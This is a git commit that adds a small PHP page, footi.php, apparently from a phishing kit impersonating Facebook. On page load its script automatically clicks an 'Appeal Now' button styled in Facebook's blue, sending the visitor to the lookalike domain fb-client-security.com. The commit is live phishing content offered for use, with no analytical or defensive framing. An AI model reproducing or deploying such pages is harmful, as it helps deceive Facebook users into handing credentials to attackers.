3c7dc91a54b62905a9ae88865ca5ff85d73c19ca
moekugd <42946769+moekugd@users.noreply.github.com>
2019-10-29 16:33:25 -0400

    Add files via upload

---
+++ footi.php
@@ -0,0 +1,14 @@
+<script>
+	window.onload=function(){
+  document.getElementById("linkid").click();
+};
+</script>
+
+<button onclick="window.location='http://fb-client-security.com';" id="linkid" name="linkid">Appeal Now</button>
+<style>
+	#linkid {
+		background-color: #4267b2 !important;
+		border-color: #4267b2 !important;
+		color: white !important
+	}
+</style>
